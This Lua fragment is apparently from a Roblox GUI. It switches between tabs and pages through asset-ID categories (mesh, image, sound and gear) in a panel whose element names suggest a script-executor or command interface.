-- Define variables to track pages
local assetIdPages = {"mesh IDs [page 0/0]", "image IDs [page 0/0]", "sound IDs [page 0/0]", "gear IDs [page 0/0]"} -- Example pages
local currentAssetIdPageIndex = 1 -- Default to the first page
local savedAssetIdPageIndex = 1 -- To save the last visited page

-- Function to update the asset ID type indicator
local function updateAssetIdTypeIndicator()
	unable["asset id type indicator"].Text = assetIdPages[currentAssetIdPageIndex]
end

-- Save the current page when switching tabs
unable["asset ids tab"].MouseButton1Click:Connect(function()
	playclicksound()
	-- Hide other elements
	unable["executor scrolling frame"].Visible = false
	unable["execute button"].Visible = false
	unable["next page"].Visible = false
	unable["previous page"].Visible = false
	unable["button holder"].Visible = false
	unable["button holder 2"].Visible = false
	unable["button holder 3"].Visible = false
	unable["list of commands"].Visible = false
	unable["command bar"].Visible = false
	unable["execute command button"].Visible = false

	-- Show asset ID-related elements
	unable["asset id type indicator"].Visible = true
	unable["next page 2 button"].Visible = true
	unable["previous page 2 button"].Visible = true
	unable["switch asset id type button"].Visible = true
	unable["switch asset id type button 2"].Visible = true

	-- Restore saved page
	currentAssetIdPageIndex = savedAssetIdPageIndex
	updateAssetIdTypeIndicator()
end)

-- Switch to the previous asset ID type
unable["switch asset id type button"].MouseButton1Click:Connect(function()
	playclicksound()

	currentAssetIdPageIndex = (currentAssetIdPageIndex - 2) % #assetIdPages + 1 -- Wrap around to the last page if necessary
	savedAssetIdPageIndex = currentAssetIdPageIndex -- Save the new page index
	updateAssetIdTypeIndicator()
end)

-- Switch to the next asset ID type
unable["switch asset id type button 2"].MouseButton1Click:Connect(function()
	playclicksound()
	
	currentAssetIdPageIndex = currentAssetIdPageIndex % #assetIdPages + 1 -- Wrap around to the first page if necessary
	savedAssetIdPageIndex = currentAssetIdPageIndex -- Save the new page index
	updateAssetIdTypeIndicator()
end)

-- Reset to the first page when execute command button is clicked
unable["execute command button"].MouseButton1Click:Connect(function()
	playclicksound()

	currentAssetIdPageIndex = 1
	savedAssetIdPageIndex = currentAssetIdPageIndex -- Save the reset page index
	updateAssetIdTypeIndicator()
end)

